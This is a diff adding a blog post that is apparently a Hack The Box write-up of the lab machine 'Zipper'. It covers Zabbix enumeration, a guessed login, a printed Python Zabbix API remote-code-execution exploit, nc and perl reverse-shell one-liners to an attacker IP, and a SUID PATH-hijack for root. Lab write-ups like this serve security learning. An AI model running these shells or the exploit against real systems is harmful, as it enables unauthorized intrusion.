@@ -1,0 +1,244 @@
+<hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Zipper retired and here’s my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.108</code> , I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">zipper.htb</code>. Let’s jump right in.
+<img src="/images/hackthebox/zipper/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with nmap to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC zipper.htb</code>
+<img src="/images/hackthebox/zipper/1.png" alt="" />
+<br /> We only get 2 ports , http on port 80 and ssh on port 22. so we are going to check http
+<br /></p>
+<hr />
+
+<h2 id="http-enumeration">HTTP enumeration</h2>
+<p><br /> By visiting <code class="highlighter-rouge">zipper.htb</code> we get the default apache2 page :
+<img src="/images/hackthebox/zipper/2.png" alt="" />
+<br /> So I’m going to run <code class="highlighter-rouge">gobuster</code> with <code class="highlighter-rouge">directory-list-2.3-medium.txt</code> to see if there are any sub directories : 
+<code class="highlighter-rouge">gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>
+<br /> Output :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://zipper.htb/
+[+] Threads      : 100
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 4m10s
+=====================================================
+2019/02/22 08:50:38 Starting gobuster
+=====================================================
+/zabbix (Status: 301)
+</code></pre></div></div>
+<p><br /> We got <code class="highlighter-rouge">/zabbix</code> , let’s look at that in the browser : 
+<img src="/images/hackthebox/zipper/3.png" alt="" />
+<br /> We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest , but before we do that let’s get an idea about <code class="highlighter-rouge">zabbix</code></p>
+
+<blockquote>
+  <p>Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -<a href="https://en.wikipedia.org/wiki/Zabbix">Wikipedia</a>
+<br /></p>
+</blockquote>
+
+<p><br /> So basically it’s a server monitoring tool , let’s login as a guest and see what we can get 
+<img src="/images/hackthebox/zipper/4.png" alt="" />
+<br /> We get this dashboard , but we are not privileged to do anything because we are <code class="highlighter-rouge">guest</code>
+<br /> After some enumeration we will notice in : Monitoring –&gt; Latest data , <code class="highlighter-rouge">Zapper's Backup Script</code>
+<img src="/images/hackthebox/zipper/5.png" alt="" />
+<br /> Now we have a potential username :  <code class="highlighter-rouge">zapper</code> , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password <code class="highlighter-rouge">zapper : zapper</code> 
+<img src="/images/hackthebox/zipper/6.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/zipper/7.png" alt="" />
+<br /> <code class="highlighter-rouge">GUI access disabled</code> , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix , check it <a href="https://www.exploit-db.com/exploits/39937">here</a> , Unfortunately valid credentials are not enough to exploit it , if we take a look here :
+<img src="/images/hackthebox/zipper/8.png" alt="" />
+<br /> We also need <code class="highlighter-rouge">hostid</code> , and to get that we need to get GUI access
+<br /></p>
+<hr />
+
+<h2 id="gui-access-through-zabbix-cli">GUI access through zabbix-cli</h2>
+<p><br /> There’s a cli tool for zabbix on <a href="https://github.com/usit-gd/zabbix-cli">github</a> , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with <code class="highlighter-rouge">install.py install</code> then you will create a <code class="highlighter-rouge">conf</code> file for it by executing <code class="highlighter-rouge">zabbix-cli --config</code>, it will be saved in  <code class="highlighter-rouge">$HOME/.zabbix-cli/zabbix-cli.conf</code> , open the <code class="highlighter-rouge">conf</code> file and in Zabbix API section add this line <code class="highlighter-rouge">zabbix_api_url=http://10.10.10.108/zabbix</code>. For details read the documentation <a href="https://github.com/usit-gd/zabbix-cli/blob/master/docs/manual.rst#installing-from-source">here</a>
+<br /> Then we will run <code class="highlighter-rouge">zabbix-cli</code> it will ask for a username and a password , we already have them <code class="highlighter-rouge">zapper : zapper</code>
+<br /> if we executed <code class="highlighter-rouge">show_usergroups</code> we will see that <code class="highlighter-rouge">zapper</code> is in a group called <code class="highlighter-rouge">No access to the fronted</code> and GUI access to that group is disabled
+<img src="/images/hackthebox/zipper/9.png" alt="" />
+<br /> We will create a new group and call it <code class="highlighter-rouge">guiaccess</code> and leave GUI access as system default
+<code class="highlighter-rouge">create_usergroup</code>
+<img src="/images/hackthebox/zipper/10.png" alt="" />
+<br /> Then we will add <code class="highlighter-rouge">zapper</code> to that group and delete him from <code class="highlighter-rouge">No access to the fronted</code> 
+<code class="highlighter-rouge">add_user_to_usergroup</code>
+<img src="/images/hackthebox/zipper/11.png" alt="" />
+<code class="highlighter-rouge">remove_user_from_usergroup</code>
+<img src="/images/hackthebox/zipper/12.png" alt="" />
+<br /> Now if we try to login again as <code class="highlighter-rouge">zapper</code> we will get the dashboard :
+<img src="/images/hackthebox/zipper/13.png" alt="" /></p>
+<hr />
+
+<h2 id="rce-and-getting-user">RCE and getting user</h2>
+<p><br /> From Configuration –&gt; Hosts we have 2 hosts and the second one is the availabe one :
+<img src="/images/hackthebox/zipper/14.png" alt="" />
+<br /> If we click on it we will get an edit page , but we will notice that the <code class="highlighter-rouge">host id</code> is included in the url as a GET parameter :
+<img src="/images/hackthebox/zipper/15.png" alt="" />
+<br /> Now we can edit the python exploit and add the host id : <code class="highlighter-rouge">10106</code> , this is how the basic login info in the script will look like :
+<img src="/images/hackthebox/zipper/16.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/zipper/17.png" alt="" />
+<br /> And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this :
+<code class="highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f</code> 
+<br /> I got this shell from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">payload all the things</a>
+<img src="/images/hackthebox/zipper/18.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/zipper/19.png" alt="" />
+<br /> Problem is , we will find that we are in a docker container , and that’s actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server.
+<img src="/images/hackthebox/zipper/20.png" alt="" />
+<br /> If we take a look at <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object">this page</a> from zabbix documentation , this part :
+<img src="/images/hackthebox/zipper/21.png" alt="" />
+<br /> there’s an option called <code class="highlighter-rouge">execute_on</code> , which has 2 possible values : <code class="highlighter-rouge">0</code> to execute on zabbix agent , and <code class="highlighter-rouge">1</code> to execute on zabbix server. We don’t have that option included in the exploit so we are using the default option <code class="highlighter-rouge">1</code> which means we are executing commands on zabbix server. So we will edit the exploit json data and add <code class="highlighter-rouge">"execute_on" : "0"</code> in those 2 parts :
+<img src="/images/hackthebox/zipper/22.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/zipper/23.png" alt="" />
+<br /> After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn’t work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : <code class="highlighter-rouge">print cmd_exe["result"]["value"]</code> , but it didn’t fix it , so I tried some other shells and the <code class="highlighter-rouge">perl</code> one worked :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.10.xx.xx";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+<p><br /> Then I used used <code class="highlighter-rouge">python3</code> pty to get a proper shell , python2 didn’t exist on the server
+<img src="/images/hackthebox/zipper/24.png" alt="" />
+<br /></p>
+<h2 id="final-exploit-after-edits-">Final exploit after edits :</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+
+<span class="c"># Exploit Title: Zabbix RCE with API JSON-RPC</span>
+<span class="c"># Date: 06-06-2016</span>
+<span class="c"># Exploit Author: Alexander Gurin</span>
+<span class="c"># Vendor Homepage: http://www.zabbix.com</span>
+<span class="c"># Software Link: http://www.zabbix.com/download.php</span>
+<span class="c"># Version: 2.2 - 3.0.3</span>
+<span class="c"># Tested on: Linux (Debian, CentOS)</span>
+<span class="c"># CVE : N/A</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">readline</span>
+
+<span class="n">ZABIX_ROOT</span> <span class="o">=</span> <span class="s">'http://10.10.10.108/zabbix'</span>	<span class="c">## Zabbix IP-address</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">ZABIX_ROOT</span> <span class="o">+</span> <span class="s">'/api_jsonrpc.php'</span>	<span class="c">## Don't edit</span>
+
+<span class="n">login</span> <span class="o">=</span> <span class="s">'zapper'</span>		<span class="c">## Zabbix login</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">'zapper'</span>	<span class="c">## Zabbix password</span>
+<span class="n">hostid</span> <span class="o">=</span> <span class="s">'10106'</span>	<span class="c">## Zabbix hostid</span>
+
+<span class="c">## auth</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"jsonrpc"</span> <span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
+    <span class="s">"method"</span> <span class="p">:</span> <span class="s">"user.login"</span><span class="p">,</span>
+    <span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
+    	<span class="s">'user'</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">login</span><span class="o">+</span><span class="s">""</span><span class="p">,</span>
+    	<span class="s">'password'</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="s">""</span><span class="p">,</span>
+    <span class="p">},</span>
+    <span class="s">"auth"</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
+    <span class="s">"id"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+<span class="p">}</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'content-type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">auth</span>  <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">(</span><span class="n">headers</span><span class="p">))</span>
+<span class="n">auth</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'</span><span class="se">\033</span><span class="s">[41m[zabbix_cmd]&gt;&gt;: </span><span class="se">\033</span><span class="s">[0m '</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">""</span> <span class="p">:</span> <span class="k">print</span> <span class="s">"Result of last command:"</span>
+	<span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"quit"</span> <span class="p">:</span> <span class="k">break</span>
+
+<span class="c">## update</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">"jsonrpc"</span><span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
+		<span class="s">"method"</span><span class="p">:</span> <span class="s">"script.update"</span><span class="p">,</span>
+		<span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
+		    <span class="s">"scriptid"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+		    <span class="s">"command"</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s">""</span><span class="p">,</span>
+		    <span class="s">"execute_on"</span> <span class="p">:</span> <span class="s">"0"</span>
+		<span class="p">},</span>
+		<span class="s">"auth"</span> <span class="p">:</span> <span class="n">auth</span><span class="p">[</span><span class="s">'result'</span><span class="p">],</span>
+		<span class="s">"id"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+	<span class="p">}</span>
+
+	<span class="n">cmd_upd</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">(</span><span class="n">headers</span><span class="p">))</span>
+
+<span class="c">## execute</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">"jsonrpc"</span><span class="p">:</span> <span class="s">"2.0"</span><span class="p">,</span>
+		<span class="s">"method"</span><span class="p">:</span> <span class="s">"script.execute"</span><span class="p">,</span>
+		<span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
+		    <span class="s">"scriptid"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+		    <span class="s">"hostid"</span><span class="p">:</span> <span class="s">""</span><span class="o">+</span><span class="n">hostid</span><span class="o">+</span><span class="s">""</span>
+		<span class="p">},</span>
+		<span class="s">"auth"</span> <span class="p">:</span> <span class="n">auth</span><span class="p">[</span><span class="s">'result'</span><span class="p">],</span>
+		<span class="s">"id"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+		<span class="s">"execute_on"</span> <span class="p">:</span> <span class="s">"1"</span>
+	<span class="p">}</span>
+
+	<span class="n">cmd_exe</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="p">(</span><span class="n">headers</span><span class="p">))</span>
+	<span class="n">cmd_exe</span> <span class="o">=</span> <span class="n">cmd_exe</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+<span class="c">#	print cmd_exe["result"]["value"]</span>
+
+</code></pre></div></div>
+<p><br /> First thing we will notice that we are <code class="highlighter-rouge">zabbix</code> and in <code class="highlighter-rouge">/home</code> there’s a directory for the user <code class="highlighter-rouge">zapper</code> 
+<img src="/images/hackthebox/zipper/25.png" alt="" />
+<br /> We can’t read <code class="highlighter-rouge">user.txt</code> and we can’t go into <code class="highlighter-rouge">.ssh</code>
+<img src="/images/hackthebox/zipper/26.png" alt="" />
+<br /> There’s another directory called <code class="highlighter-rouge">utils</code> which contains 2 files , <code class="highlighter-rouge">backup.sh</code> and <code class="highlighter-rouge">zabbix-service</code>
+<code class="highlighter-rouge">cat backup.sh</code>
+<img src="/images/hackthebox/zipper/28.png" alt="" />
+<br /> We see that it has a hardcoded password in it : <code class="highlighter-rouge">ZippityDoDah</code> , we can try to <code class="highlighter-rouge">su</code> to zapper with that password
+<img src="/images/hackthebox/zipper/29.png" alt="" />
+<br /> And it worked , now we can get the ssh key from <code class="highlighter-rouge">.ssh</code> and have ssh connection
+<img src="/images/hackthebox/zipper/30.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/zipper/31.png" alt="" />
+<br /> And we owned user !
+<br /></p>
+<hr />
+
+<h2 id="privilege-escalation-and-getting-root">Privilege Escalation and getting root</h2>
+<p><br /> If we take a look at the <code class="highlighter-rouge">utils</code> directory again and execute <code class="highlighter-rouge">zabbix-service</code> :
+<img src="/images/hackthebox/zipper/32.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/zipper/33.png" alt="" />
+<br /> It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary : 
+<code class="highlighter-rouge">find /home/zapper/utils -perm -4000</code>
+<img src="/images/hackthebox/zipper/34.png" alt="" />
+<br /> It’s a suid binary , we need to know what is it doing. Without reverse engineering , <code class="highlighter-rouge">strings</code> was enough :
+<code class="highlighter-rouge">strings zabbix-service</code>
+<img src="/images/hackthebox/zipper/35.png" alt="" />
+<br /> This command is being executed when we type <code class="highlighter-rouge">start</code> : <code class="highlighter-rouge">systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent</code> , so what are we going to do is the same as we did in <a href="/hack-the-box/dab/">Dab</a> , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default <code class="highlighter-rouge">systemctl</code> points to <code class="highlighter-rouge">/bin/systemctl</code>
+<img src="/images/hackthebox/zipper/36.png" alt="" />
+<br /> We will create a <code class="highlighter-rouge">c</code> program to execute <code class="highlighter-rouge">/bin/bash</code> :
+<img src="/images/hackthebox/zipper/37.png" alt="" />
+<br /> Then we will compile it with gcc : <code class="highlighter-rouge">gcc exploit.c -o systemctl</code>
+<br /> Now we have our fake binary ready : 
+<img src="/images/hackthebox/zipper/38.png" alt="" />
+<br /> We will add <code class="highlighter-rouge">/home/zapper/utils</code> as the first entry in <code class="highlighter-rouge">PATH</code> env variable , so the system will look there first : 
+<code class="highlighter-rouge">export PATH=/home/zapper/utils:$PATH</code>
+<br /> This is changing the <code class="highlighter-rouge">PATH</code> variable to <code class="highlighter-rouge">/home/zapper/utils:</code> + the old path 
+<img src="/images/hackthebox/zipper/39.png" alt="" />
+<br /> Now <code class="highlighter-rouge">systemctl</code> points to our fake binary , let’s run <code class="highlighter-rouge">zabbix-service</code> :
+<img src="/images/hackthebox/zipper/40.png" alt="" />
+<br /> And we owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/access/">Hack The Box - Access</a></p>
+<hr />
+
